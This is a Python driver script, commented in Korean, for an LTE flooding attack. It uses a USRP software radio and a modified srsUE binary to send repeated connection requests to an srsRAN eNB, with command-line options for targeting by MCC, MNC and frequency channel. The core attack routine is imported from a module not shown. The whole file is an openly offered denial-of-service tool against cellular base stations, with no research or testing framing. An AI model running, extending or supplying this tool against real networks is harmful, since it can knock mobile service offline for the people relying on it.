#!/usr/bin/env python3
"""
LTE Flooding Script - Main
USRP 장치를 사용하여 srsRAN eNB에 연결 요청을 반복적으로 전송합니다.
"""

import subprocess
import time
import signal
import sys
import os
import re
from typing import Optional
import argparse
import logging
from pathlib import Path

from enb_scout import find_enb
from flooding_attack import run_flooding_attack

# 로깅 설정
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


def check_usrp_connection(usrp_args: Optional[str] = None) -> bool:
    """USRP 장치 연결 확인"""
    logger.info("USRP 장치 연결 확인 중...")
    
    try:
        result = subprocess.run(
            ["uhd_find_devices"],
            capture_output=True,
            text=True,
            timeout=5
        )
        
        serial_match = re.search(r'serial:\s*([^\s,]+)', result.stdout + result.stderr)
        if serial_match:
            found_serial = serial_match.group(1)
            user_serial = None
            if usrp_args:
                user_serial_match = re.search(r'serial=([^\s"]+)', usrp_args)
                user_serial = user_serial_match.group(1) if user_serial_match else None
            
            if user_serial and found_serial.upper() == user_serial.upper():
                logger.info(f"✓ USRP 장치 연결 확인됨: serial={found_serial}")
                return True
            elif user_serial:
                logger.warning(f"지정한 시리얼({user_serial})과 발견된 시리얼({found_serial})이 다릅니다")
                logger.info(f"발견된 장치 사용: serial={found_serial}")
                return True
            else:
                logger.info(f"✓ USRP 장치 발견: serial={found_serial}")
                return True
        
        return True
    except Exception as e:
        logger.warning(f"USRP 확인 중 오류: {e}")
        return False


class LTEFlooder:
    """LTE Flooding 메인 클래스"""
    
    def __init__(self, usrp_args: Optional[str] = None, mcc: Optional[int] = None,
                 mnc: Optional[int] = None, earfcn: Optional[int] = None,
                 template_config: Optional[str] = None, srsue_path: Optional[str] = None):
        self.usrp_args = usrp_args
        self.mcc = mcc
        self.mnc = mnc
        self.earfcn = earfcn
        self.template_config = template_config or "ue_template.conf"
        self.srsue_path = srsue_path
        self.usim_opc, self.usim_k = self._load_usim_keys()
        self.running = False
    
    def _load_usim_keys(self) -> tuple[str, str]:
        """환경변수 또는 .env 파일에서 USIM 키 로드"""
        opc = os.getenv('USIM_OPC')
        k = os.getenv('USIM_K')
        
        env_file = Path('.env')
        if env_file.exists():
            with open(env_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line.startswith('#') or not line:
                        continue
                    if '=' in line:
                        key, value = line.split('=', 1)
                        key = key.strip()
                        value = value.strip()
                        if key == 'USIM_OPC' and not opc:
                            opc = value
                        elif key == 'USIM_K' and not k:
                            k = value
        
        if not opc or not k:
            logger.error("USIM 키를 찾을 수 없습니다. .env 파일 또는 환경변수(USIM_OPC, USIM_K)를 설정하세요.")
            raise ValueError("USIM 키가 설정되지 않았습니다.")
        
        # USIM 키 길이 검증 (32자리)
        if len(k) != 32:
            logger.error(f"USIM K 길이가 잘못되었습니다: {len(k)}자 (32자 필요)")
            if len(k) > 0:
                logger.error(f"현재 값 (처음 20자): {k[:20]}...")
            raise ValueError(f"USIM K는 32자리 16진수여야 합니다. 현재: {len(k)}자")
        
        if len(opc) != 32:
            logger.error(f"USIM OPC 길이가 잘못되었습니다: {len(opc)}자 (32자 필요)")
            if len(opc) > 0:
                logger.error(f"현재 값 (처음 20자): {opc[:20]}...")
            raise ValueError(f"USIM OPC는 32자리 16진수여야 합니다. 현재: {len(opc)}자")
        
        try:
            int(k, 16)
            int(opc, 16)
        except ValueError:
            logger.error("USIM 키는 16진수 형식이어야 합니다 (0-9, a-f)")
            raise ValueError("USIM 키 형식 오류")
        
        return opc, k
    
    def start(self):
        """Flooding 시작"""
        if self.running:
            logger.warning("이미 실행 중입니다.")
            return
        
        self.running = True
        
        # 템플릿 config 파일 확인
        if not os.path.exists(self.template_config):
            logger.error(f"템플릿 config 파일을 찾을 수 없습니다: {self.template_config}")
            logger.info("템플릿 config 파일을 생성하거나 경로를 확인하세요.")
            return
        
        # 로그 출력
        target_info = []
        if self.earfcn is not None:
            target_info.append(f"주파수: EARFCN {self.earfcn}")
        if self.mcc is not None:
            target_info.append(f"MCC: {self.mcc}")
        if self.mnc is not None:
            target_info.append(f"MNC: {self.mnc}")
        target_str = ", ".join(target_info) if target_info else "기본 설정"
        logger.info(f"설정: {target_str}")
        logger.info(f"템플릿 config: {self.template_config}")
        
        if self.usrp_args:
            logger.info(f"USRP 인자: {self.usrp_args}")
        else:
            logger.info("USRP 인자가 지정되지 않았습니다. 기본 장치 사용")
        
        # USRP 연결 확인
        if not check_usrp_connection(self.usrp_args):
            logger.error("USRP 장치 연결을 확인할 수 없습니다.")
            raise RuntimeError("USRP 장치 연결 실패")
        
        # eNB 찾기 (템플릿 config 사용)
        enb_found = find_enb(self.template_config, self.usrp_args)
        
        if not enb_found:
            logger.warning("eNB를 찾지 못했습니다.")
            self.running = False
            return
        
        # 공격 시작
        run_flooding_attack(
            self.template_config, self.usrp_args, lambda: self.running,
            mcc=self.mcc, mnc=self.mnc, earfcn=self.earfcn,
            usim_opc=self.usim_opc, usim_k=self.usim_k,
            srsue_path=self.srsue_path
        )
    
    def stop(self):
        """Flooding 중지"""
        if not self.running:
            return
        
        logger.info("LTE Flooding 중지 중...")
        self.running = False
        
        # 모든 srsue 프로세스 종료
        try:
            subprocess.run(["pkill", "-9", "srsue"], timeout=5)
        except:
            pass
        
        logger.info("LTE Flooding이 중지되었습니다.")


def main():
    parser = argparse.ArgumentParser(
        description="LTE Flooding - USRP를 사용하여 srsRAN eNB에 연결 요청을 반복 전송"
    )
    parser.add_argument(
        "--usrp-args",
        type=str,
        default=None,
        help="USRP 장치 인자 (예: serial=30AD123 또는 type=b200)"
    )
    parser.add_argument(
        "--mcc",
        type=int,
        default=None,
        help="Mobile Country Code (예: 123)"
    )
    parser.add_argument(
        "--mnc",
        type=int,
        default=None,
        help="Mobile Network Code (예: 456)"
    )
    parser.add_argument(
        "--earfcn",
        type=int,
        default=None,
        help="주파수 채널 번호 (EARFCN)"
    )
    parser.add_argument(
        "--template-config",
        type=str,
        default="ue_template.conf",
        help="템플릿 UE config 파일 경로 (기본값: ue_template.conf)"
    )
    parser.add_argument(
        "--srsue-path",
        type=str,
        default=None,
        help="srsue 바이너리 경로 (기본값: 자동 탐지)"
    )
    
    args = parser.parse_args()
    
    # srsue 바이너리 경로 자동 탐지
    if not args.srsue_path:
        possible_paths = [
            "attack_ue/build/srsue/src/srsue",
            "attack_ue/build/srsue/srsue",
            "attack_ue/srsue/build/src/srsue",
        ]
        for path in possible_paths:
            if os.path.exists(path) and os.path.isfile(path):
                args.srsue_path = path
                logger.info(f"자동 탐지: srsue 바이너리 경로 = {path}")
                break
        if not args.srsue_path:
            logger.warning("srsue 바이너리를 자동으로 찾을 수 없습니다. --srsue-path를 지정하세요.")
    
    # 템플릿 config 방식 (ue_template.conf 사용)
    flooder = LTEFlooder(
        usrp_args=args.usrp_args,
        mcc=args.mcc,
        mnc=args.mnc,
        earfcn=args.earfcn,
        template_config=args.template_config,
        srsue_path=args.srsue_path
    )
    
    # 시그널 핸들러 설정
    def signal_handler(sig, frame):
        logger.info("\n종료 신호 수신...")
        flooder.stop()
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    try:
        flooder.start()
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        logger.info("\n사용자에 의해 중지됨")
    finally:
        flooder.stop()


if __name__ == "__main__":
    main()
